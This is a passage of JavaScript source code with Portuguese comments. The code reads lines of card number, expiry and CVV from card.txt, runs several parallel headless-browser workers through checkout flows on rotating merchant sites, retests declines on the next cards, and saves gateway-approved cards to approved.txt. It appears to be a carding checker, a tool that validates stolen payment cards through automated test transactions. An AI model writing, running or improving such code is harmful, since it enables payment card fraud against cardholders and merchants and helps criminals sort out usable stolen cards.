          console.log(`[${new Date().toISOString()}] Reteste: detectou retorno ao início (campo escola visível), refazendo fluxo`);
          return { status: 'RETRY', errorReason: 'Retorno ao início' };
        }
      }

      if (paymentStatus) break;
      await waitForTimeout(1000);
      attempts++;
    }

    if (paymentResponse) {
      const status = paymentResponse.transactionStatus || paymentResponse.status || paymentResponse.result;
      const errorReason = paymentResponse.gwErrorReason || paymentResponse.errorReason || paymentResponse.reason || paymentResponse.message;
      return { status, errorReason: errorReason || null };
    }

    return { status: 'ERROR', errorReason: 'Sem resposta do gateway' };
  } catch (error) {
    console.error(`Erro no reteste: ${error.message}`);
    return { status: 'ERROR', errorReason: error.message };
  }
}

module.exports = { checkCard, retestCard, getNextSite };

// Fila de escrita para serializar as remoções de cards (evita corrida entre workers)
let fileWriteQueue = Promise.resolve();

// Função para remover um card específico do arquivo (para não testar de novo)
function removeCardFromFile(filePath, cardLine) {
  // Serializa as operações de escrita para evitar corrida entre workers
  fileWriteQueue = fileWriteQueue.then(() => {
    try {
      const data = fs.readFileSync(filePath, 'utf-8');
      const lines = data.split('\n').filter(line => line.trim());
      const remaining = lines.filter(line => line.trim() !== cardLine.trim());
      fs.writeFileSync(filePath, remaining.join('\n'));
    } catch (e) {
      // Ignora erro de leitura/escrita
    }
  });
  return fileWriteQueue;
}

// Execução direto (lê do card.txt e testa cada cartão)
if (require.main === module) {
  (async () => {
    const fs = require('fs');
    const path = require('path');

    // Lê o card.txt
    const cardPath = path.join(__dirname, 'card.txt');
    let cardData = fs.readFileSync(cardPath, 'utf-8').trim();

    if (!cardData) {
      console.error('card.txt está vazio');
      process.exit(1);
    }

    // Divide em linhas
    const lines = cardData.split('\n').filter(line => line.trim());

    ui.addLog(`Iniciando teste de ${lines.length} cartões com ${THREADS} threads em paralelo`, 'info');

    let successCount = 0;
    let declinedCount = 0;
    let errorCount = 0;
    let totalTested = 0;

    // Índice compartilhado entre workers
    let nextCardIndex = 0;

    // Função que cada worker executa
    async function worker() {
      let currentBrowser = null;
      let currentPage = null;

      try {
        while (true) {
          const cardIdx = nextCardIndex++;
          if (cardIdx >= lines.length) return;

          const cardLine = lines[cardIdx];
          const [cardNumber, expiryMonth, expiryYear, cvv] = cardLine.split('|');

          if (!cardNumber || !expiryMonth || !expiryYear || !cvv) {
            console.error(`Formato inválido: ${cardLine}`);
            continue;
          }

          // Se o browser atual foi fechado/destruído, recria
          if (currentBrowser && currentBrowser.isConnected && !currentBrowser.isConnected()) {
            currentBrowser = null;
            currentPage = null;
          }
          if (currentPage && currentPage.isClosed()) {
            currentPage = null;
          }

          totalTested++;
          ui.addLog(`[${totalTested}/${lines.length}] Testando: ${cardLine}`, 'info');

          const site = getNextSite();
          ui.addLog(`  Site: ${site.name} / Item: ${site.item}`, 'info');

          try {
            const result = await checkCard(cardNumber, expiryMonth, expiryYear, cvv, currentPage, currentBrowser, true, site);

            if (result && result.browser) {
              currentBrowser = result.browser;
              currentPage = result.page;
            }

            const status = result && result.status;

            if (status === 'APPROVED') {
              successCount++;
              ui.addLog(`✓ APPROVED (${result.duration})`, 'success');
              ui.addCard(cardNumber, 'APPROVED', result.duration, null, 'Transação aprovada');
              fs.appendFileSync(path.join(__dirname, 'approved.txt'), `${cardNumber}|${expiryMonth}|${expiryYear}|${cvv}\n`);
              if (currentBrowser) {
                try { await currentBrowser.close(); } catch (e) {}
                currentBrowser = null;
                currentPage = null;
              }
            } else {
              // Qualquer status != APPROVED (REPROVADA, DECLINED, Suspected fraud, ERROR, etc) retesta 2x na mesma aba
              const isTimeout = result.errorReason === 'Falha após 3 tentativas (timeout/erro de navegação)';

              if (isTimeout) {
                errorCount++;
                ui.addLog(`✗ Timeout após 3 tentativas`, 'error');
                ui.addCard(cardNumber, 'ERROR', result.duration, result.errorReason, 'Timeout');
                if (currentBrowser) {
                  try { await currentBrowser.close(); } catch (e) {}
                  currentBrowser = null;
                  currentPage = null;
                }
              } else {
                declinedCount++;
                ui.addLog(`✓ ${status} (${result.duration}) - ${result.errorReason}`, 'warning');
                ui.addCard(cardNumber, status, result.duration, result.errorReason, result.errorReason);

                // Retesta os próximos 2 cards atomicamente na mesma aba
                for (let r = 0; r < 2; r++) {
                  const retestIdx = nextCardIndex++;
                  if (retestIdx >= lines.length) break;
                  const retestLine = lines[retestIdx];
                  const [rc, rm, ry, rcv] = retestLine.split('|');
                  if (!rc || !rm || !ry || !rcv) continue;

                  ui.addLog(`[RETESTE ${r + 1}/2] Testando: ${retestLine}`, 'info');

                  let retestResult;
                  try {
                    retestResult = await checkCard(rc, rm, ry, rcv, currentPage, currentBrowser, true, site);
                  } catch (err) {
                    retestResult = { status: 'ERROR', errorReason: err.message };
                  }

                  if (retestResult && retestResult.browser) {
                    currentBrowser = retestResult.browser;
                    currentPage = retestResult.page;
                  }

                  if (retestResult && retestResult.status === 'APPROVED') {
                    successCount++;
                    ui.addLog(`✓ APPROVED (reteste)`, 'success');
                    ui.addCard(rc, 'APPROVED', 'N/A', null, 'Aprovado no reteste');
                    fs.appendFileSync(path.join(__dirname, 'approved.txt'), `${rc}|${rm}|${ry}|${rcv}\n`);
                    break;
                  } else if (retestResult && retestResult.status !== 'APPROVED') {
                    declinedCount++;
                    ui.addLog(`✓ ${retestResult.status} (reteste) - ${retestResult.errorReason}`, 'warning');
                    ui.addCard(rc, retestResult.status, 'N/A', retestResult.errorReason, retestResult.errorReason);
                  } else {
                    errorCount++;
                    ui.addLog(`✗ Erro/Timeout (reteste)`, 'error');
                    ui.addCard(rc, 'ERROR', 'N/A', retestResult ? retestResult.errorReason : 'Timeout');
                  }

                  await removeCardFromFile(cardPath, retestLine);
                  ui.updateStats(totalTested, successCount, declinedCount, errorCount);
                }

                // Fecha browser após reteste
                if (currentBrowser) {
                  try { await currentBrowser.close(); } catch (e) {}
                  currentBrowser = null;
                  currentPage = null;
                }
              }
            }
          } catch (error) {
            errorCount++;
            ui.addLog(`✗ Erro: ${error.message}`, 'error');
            ui.addCard(cardNumber, 'ERROR', 'N/A', error.message);
            if (currentBrowser) {
              try { await currentBrowser.close(); } catch (e) {}
              currentBrowser = null;
              currentPage = null;
            }
          }

          await removeCardFromFile(cardPath, cardLine);
          ui.updateStats(totalTested, successCount, declinedCount, errorCount);
        }
      } finally {
        if (currentBrowser) {
          try { await currentBrowser.close(); } catch (e) {}
        }
      }
    }

    // Lança os workers em paralelo
    const workerCount = Math.min(THREADS, lines.length);
    const workers = [];
    for (let w = 0; w < workerCount; w++) {
      workers.push(worker());
    }
    await Promise.all(workers);

    // Limpa o card.txt (todos os cartões foram testados)
    fs.writeFileSync(cardPath, '');

    ui.addLog(`Teste concluído! Total: ${totalTested} | Sucesso: ${successCount} | Declined: ${declinedCount} | Erro: ${errorCount}`, 'success');
  })();
}
